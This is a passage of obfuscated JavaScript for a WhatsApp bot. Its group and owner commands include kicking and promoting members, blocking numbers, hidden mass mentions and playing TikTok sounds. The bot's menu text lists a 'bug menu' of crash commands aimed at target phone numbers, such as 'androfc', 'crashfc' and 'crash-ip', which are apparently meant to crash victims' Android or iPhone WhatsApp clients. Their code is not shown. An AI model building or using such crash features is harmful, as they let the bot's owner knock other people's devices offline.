          _0x2beff4(_0x32d95b, jumlah);
        }
        break;
      case "block":
        if (!_0x2f9f98) {
          return _0x12df7a("*Khusus Owner Leccy!*");
        }
        blockw = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x2ae975 = await _0x23913c.onWhatsApp(blockw + "@s.whatsapp.net");
        if (_0x2ae975.length == 0x0) {
          return _0x12df7a("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        let _0x146127 = blockw + "@s.whatsapp.net";
        await _0x23913c.updateBlockStatus(_0x146127, "block").then(_0x58e687 => _0x12df7a(JSON.stringify(_0x58e687, null, 0x2)))['catch'](_0x437b19 => _0x12df7a(JSON.stringify(_0x437b19, null, 0x2)));
        break;
      case 'unblock':
        if (!_0x2f9f98) {
          return _0x12df7a("*Khusus Owner Leccy!*");
        }
        blockww = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x42bd25 = await _0x23913c.onWhatsApp(blockww + "@s.whatsapp.net");
        if (_0x42bd25.length == 0x0) {
          return _0x12df7a("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        let _0x451134 = blockww + "@s.whatsapp.net";
        await _0x23913c.updateBlockStatus(_0x451134, "unblock").then(_0x59e093 => _0x12df7a(JSON.stringify(_0x59e093, null, 0x2)))["catch"](_0x1b395f => _0x12df7a(JSON.stringify(_0x1b395f, null, 0x2)));
        break;
      case 'leave':
        if (!_0x2f9f98) {
          return _0x12df7a("*Khusus Owner Leccy!*");
        }
        if (!_0x5a4410) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        _0x12df7a("Bye Everyone.");
        await _0x23913c.groupLeave(_0x2afcf2);
        break;
      case "restart":
      case "shutdown":
        if (!_0x2f9f98) {
          return _0x12df7a("*Khusus Owner Leccy!*");
        }
        _0x12df7a("Goodbye🖐");
        await sleep(0xbb8);
        process.exit();
        break;
      case 'soundmenu':
      case "jadibotmenu":
      case 'ownermenu':
      case 'bugmenu':
      case "groupmenu":
        {
          txt1 = "_*OWNER MENU*_\n┌─ #join\n├─ #restart\n├─ #leave\n├─ #unblock\n├─ #block\n├─ #shutdown\n├─ #unmute\n├─ #mute\n├─ #listown\n├─ #addown\n├─ #delown\n├─ #addprem\n├─ #delprem\n└─ #listprem\n\n" + _0x2a7e31(process.uptime());
          txt2 = "_*BUG SAKIT ANDROID FC*_\n┌─➢ #androfc 628XXXX,3\n└─➢ #iphonfc 628XXXX,3\n\n_*BUG HARD-SAKIT*_\n┌─ #gaslec 628XXXX\n├─ #infinity 628XXXX\n├─ #lecunli 628XXXX\n├─ #santet 628XXXX\n├─ #crashfc 628XXXX\n└─ #homecrash 628XXXX\n\n_*BUG EMOJI-ANDROID*_\n┌─ #🌹 <amount>\n├─ #🌷 <amount>\n├─ #🔥 <amount>\n├─ #🦖 <amount>\n└─亗 #🦕 <amount>\n\n_*BUG CHAT-IPHONE*_\n┌─ #bug-ip <amount>\n├─ #crash-ip <amount>\n├─ #home-ip <amount>\n└─ #blank-ip <amount>\n\n" + _0x2a7e31(process.uptime());
          txt3 = "_*GROUP MENU*_\n┌─ #kick\n├─ #open\n├─ #close\n├─ #linkgc\n├─ #linkgrup\n├─ #revoke\n├─ #hidetag\n├─ #promote\n├─ #demote\n├─ #setname\n├─ #setdesc\n└─ #editinfo\n\n" + _0x2a7e31(process.uptime());
          txt4 = "_*CPANEL MENU*_\n┌─ #listapi\n├─ #addapi\n├─ #delusr\n├─ #detusr\n├─ #listusr\n├─ #addusr\n├─ #listsrv\n├─ #detsrv\n├─ #delsrv\n├─ #addsrv\n├─ #bansrv\n├─ #unbansrv\n└─ #reinstall\n\n" + _0x2a7e31(process.uptime());
          txt5 = "_*JADIBOT MENU*_\n┌─ #jadibot\n├─ #stopjadibot\n├─ #del-sesi\n├─ #resetjadibot\n└─ #listjadibot\n\n" + _0x2a7e31(process.uptime());
          txt6 = "_*SOUND MENU*_\n┌─ #sound1\n├─ #sound2\n├─ #sound3\n├─ #sound4\n├─ #sound5\n├─ #sound6\n└─ #sound7\n\n(sound5 - sound160)\n\n" + _0x2a7e31(process.uptime());
          if (_0x2018a7 == "ownermenu") {
            _0x12df7a(txt1);
          } else {
            if (_0x2018a7 == 'bugmenu') {
              _0x12df7a(txt2);
            } else {
              if (_0x2018a7 == "groupmenu") {
                _0x12df7a(txt3);
              } else {
                if (_0x2018a7 == 'jadibotmenu') {
                  _0x12df7a(txt5);
                } else if (_0x2018a7 == 'soundmenu') {
                  _0x12df7a(txt6);
                }
              }
            }
          }
        }
        break;
      case "menu":
      case 'help':
        {
          _0x4c78ce("\n┌─ • *BOTNAME : " + global.botName + "*\n├─ • *DEVELOPER : " + global.ownerName + "*\n├─ • *PENGGUNA : " + (_0x2f9f98 ? "OWNER" : "USERS") + "*\n└─ • *NUMBER : @" + _0x4d133f.split('@')[0x0] + "*\n\n☆ *LUCIVER MENU SIMPEL* ☆\n┌─[☆ *.bugmenu*]\n├─[☆ *.groupmenu*]\n├─[☆ *.ownermenu*]\n├─[☆ *.jadibotmenu*]\n└─[☆ *.soundmenu*]\n\n*" + _0x2a7e31(process.uptime()) + "*\n", [_0x4d133f]);
        }
        break;
      case "join":
        if (_0x1c8568.key.fromMe) {
          return;
        }
        if (!_0x2f9f98) {
          return _0x12df7a("This feature can only be used by the owner Bot");
        }
        if (!q) {
          return _0x12df7a("Enter Group Link!\nEx: .join https://chat.whatsapp.com/xxxx");
        }
        if (!_0x3220a1[0x0].includes("whatsapp.com")) {
          return _0x12df7a("Link Invalid!");
        }
        resjoin = _0x3220a1[0x0].split('https://chat.whatsapp.com/')[0x1];
        try {
          join = await _0x23913c.groupAcceptInvite(resjoin);
          _0x12df7a(join);
        } catch (_0x48aa3b) {
          _0x12df7a(util.format(_0x48aa3b));
        }
        break;
      case 'linkgrup':
      case 'linkgc':
        {
          if (!_0x5a4410) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xfcbb7a) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!_0x396113 && !_0x2f9f98) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          url_ = await _0x23913c.groupInviteCode(_0x2afcf2);
          yurl = 'https://chat.whatsapp.com/' + url_;
          _0x12df7a(yurl);
        }
        break;
      case "open":
        if (!_0x5a4410) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0x396113 && !_0x2f9f98) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xfcbb7a) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        await _0x23913c.groupSettingUpdate(_0x2afcf2, "not_announcement");
        _0x12df7a("*OPENED* The group is opened by admin\nNow members can send messages");
        break;
      case 'close':
        if (!_0x5a4410) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0x396113 && !_0x2f9f98) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xfcbb7a) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        await _0x23913c.groupSettingUpdate(_0x2afcf2, 'announcement');
        _0x12df7a("*CLOSED* group closed by admin\nnow only admin can send messages");
        break;
      case "revoke":
        {
          if (!_0x5a4410) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xfcbb7a) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!_0x396113 && !_0x2f9f98) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          await _0x23913c.groupRevokeInvite(_0x2afcf2).then(_0x4ecc49 => _0x12df7a(JSON.stringify(_0x4ecc49, null, 0x2)))["catch"](_0x117db8 => _0x12df7a(JSON.stringify(_0x117db8, null, 0x2)));
        }
        break;
      case 'kick':
        if (!_0x5a4410) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0x396113 && !_0x2f9f98) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xfcbb7a) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        if (_0x1c8568.message.extendedTextMessage === undefined || _0x1c8568.message.extendedTextMessage === null) {
          return _0x12df7a("Reply targetnya!");
        }
        _0x12df7a("Sampah Grup Berhasil di Keluarkan!");
        remove = _0x1c8568.message.extendedTextMessage.contextInfo.participant;
        await _0x23913c.groupParticipantsUpdate(_0x2afcf2, [remove], "remove");
        break;
      case "hidetag":
        {
          if (!_0x5a4410) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x396113 && !_0x2f9f98) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          let _0x451b76 = [];
          _0x28142b.map(_0x3121d9 => _0x451b76.push(_0x3121d9.id));
          _0x23913c.sendMessage(_0x2afcf2, {
            'text': q ? q : '',
            'mentions': _0x451b76
          });
        }
        break;
      case "promote":
        {
          if (!_0x5a4410) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x396113 && !_0x2f9f98) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xfcbb7a) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (_0x1c8568.message.extendedTextMessage === undefined || _0x1c8568.message.extendedTextMessage === null) {
            return _0x12df7a("Reply targetnya!");
          }
          promote = _0x1c8568.message.extendedTextMessage.contextInfo.participant;
          await _0x23913c.groupParticipantsUpdate(_0x2afcf2, [promote], "promote").then(_0x564f6b => _0x12df7a(JSON.stringify(_0x564f6b, null, 0x2)))["catch"](_0x42bf5a => _0x12df7a(JSON.stringify(_0x42bf5a, null, 0x2)));
        }
        break;
      case "demote":
        {
          if (!_0x5a4410) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x396113 && !_0x2f9f98) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xfcbb7a) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (_0x1c8568.message.extendedTextMessage === undefined || _0x1c8568.message.extendedTextMessage === null) {
            return _0x12df7a("Reply targetnya!");
          }
          demote = _0x1c8568.message.extendedTextMessage.contextInfo.participant;
          await _0x23913c.groupParticipantsUpdate(_0x2afcf2, [demote], "demote").then(_0x49e070 => _0x12df7a(JSON.stringify(_0x49e070, null, 0x2)))["catch"](_0x4cfa15 => _0x12df7a(JSON.stringify(_0x4cfa15, null, 0x2)));
        }
        break;
      case 'setname':
      case "setsubject":
        {
          if (!_0x5a4410) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x396113 && !_0x2f9f98) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xfcbb7a) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!q) {
            return _0x12df7a("Nama Group Nya Mana?\n\nEx:\n.setname nama_group");
          }
          await _0x23913c.groupUpdateSubject(_0x2afcf2, q).then(_0x4e9134 => _0x12df7a(JSON.stringify(_0x4e9134, null, 0x2)))["catch"](_0x2cefc3 => _0x12df7a(JSON.stringify(_0x2cefc3, null, 0x2)));
        }
        break;
      case "setdesc":
      case 'setdesk':
        {
          if (!_0x5a4410) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x396113 && !_0x2f9f98) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xfcbb7a) {
            return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!q) {
            return _0x12df7a("Teks Deskripsi Nya Mana?\n\nEx:\n.setdesc teks_deskripsi");
          }
          await _0x23913c.groupUpdateDescription(_0x2afcf2, q).then(_0x5c647f => _0x12df7a(JSON.stringify(_0x5c647f, null, 0x2)))["catch"](_0x57b00e => _0x12df7a(JSON.stringify(_0x57b00e, null, 0x2)));
        }
        break;
      case "editinfo":
        if (!_0x5a4410) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0x396113 && !_0x2f9f98) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xfcbb7a) {
          return _0x12df7a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        if (_0x3220a1[0x0] === 'open') {
          await _0x23913c.groupSettingUpdate(_0x2afcf2, "unlocked").then(_0xa60388 => _0x12df7a("Successfully Opened Group Edit Info"))["catch"](_0x3531f6 => _0x12df7a(JSON.stringify(_0x3531f6, null, 0x2)));
        } else if (_0x3220a1[0x0] === "close") {
          await _0x23913c.groupSettingUpdate(_0x2afcf2, 'locked').then(_0x31586a => _0x12df7a("Successfully Closed Group Edit Info"))["catch"](_0x5e94cb => _0x12df7a(JSON.stringify(_0x5e94cb, null, 0x2)));
        } else {
          _0x12df7a("*MODE DESKRIPSI GROUP*\n\n*_Open : semua member bisa edit deskripsi grup_*\n\n*_Close: hanya admin group yang bisa edit deskripsi_*\n\n*Example:*\n" + (_0x36b68d + _0x2018a7) + " close");
        }
        break;
      case "sound1":
      case "sound2":
      case 'sound3':
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case "sound9":
      case "sound10":
      case 'sound11':
      case 'sound12':
      case "sound13":
      case "sound14":
      case 'sound15':
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case "sound21":
      case 'sound22':
      case "sound23":
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case "sound29":
      case "sound30":
      case "sound31":
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case 'sound36':
      case "sound37":
      case "sound38":
      case "sound39":
      case "sound40":
      case "sound41":
      case 'sound42':
      case "sound43":
      case 'sound44':
      case 'sound45':
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case 'sound50':
      case "sound51":
      case "sound52":
      case "sound53":
      case 'sound54':
      case "sound55":
      case "sound56":
      case "sound57":
      case 'sound58':
      case "sound59":
      case "sound60":
      case "sound61":
      case "sound62":
      case 'sound63':
      case "sound64":
      case "sound65":
      case "sound66":
      case "sound67":
      case 'sound68':
      case 'sound69':
      case 'sound70':
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case "sound76":
      case "sound77":
      case "sound78":
      case "sound79":
      case "sound80":
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case 'sound85':
      case "sound86":
      case "sound87":
      case 'sound88':
      case "sound89":
      case "sound90":
      case 'sound91':
      case "sound92":
      case 'sound93':
      case "sound94":
      case "sound95":
      case "sound96":
      case "sound97":
      case "sound98":
      case "sound99":
      case "sound100":
      case 'sound101':
      case "sound102":
      case "sound103":
      case "sound104":
      case "sound105":
      case "sound106":
      case 'sound107':
      case 'sound108':
      case "sound109":
      case "sound110":
      case "sound111":
      case "sound112":
      case "sound113":
      case 'sound114':
      case 'sound115':
      case "sound116":
      case "sound117":
      case "sound118":
      case 'sound119':
      case 'sound120':
      case "sound121":
      case 'sound122':
      case "sound123":
      case "sound124":
      case "sound125":
      case "sound126":
      case "sound127":
      case 'sound128':
      case 'sound129':
      case "sound130":
      case "sound131":
      case 'sound132':
      case "sound133":
      case "sound134":
      case "sound135":
      case "sound136":
      case "sound137":
      case 'sound138':
      case "sound139":
      case "sound140":
      case 'sound141':
      case "sound142":
      case "sound143":
      case "sound144":
      case "sound145":
      case "sound146":
      case 'sound147':
      case "sound148":
      case "sound149":
      case 'sound150':
      case "sound151":
      case "sound152":
      case "sound153":
      case "sound154":
      case 'sound155':
      case "sound156":
      case "sound157":
      case 'sound158':
      case "sound159":
      case "sound160":
      case 'sound161':
        {
          if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454 && !_0x1cafe0) {
            return;
          }
          strava_dev = await getBuffer("https://github.com/Lexxy24/MusicTikTok-Api/raw/master/tiktokmusic/" + _0x2018a7 + ".mp3");
          _0x23913c.sendMessage(_0x2afcf2, {
            'audio': strava_dev,
            'mimetype': "audio/mp4",
            'ptt': true
          }, {
            'quoted': _0x1c8568
          });
        }
        break;
      default:
    }
  } catch (_0x5185b4) {
    froom = _0x1c8568.key.remoteJid;
    stravaRorr = async () => {
      _0x23913c.sendMessage(froom, {
        'text': util.format(_0x5185b4)
      });
    };
    stravaRorr();
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});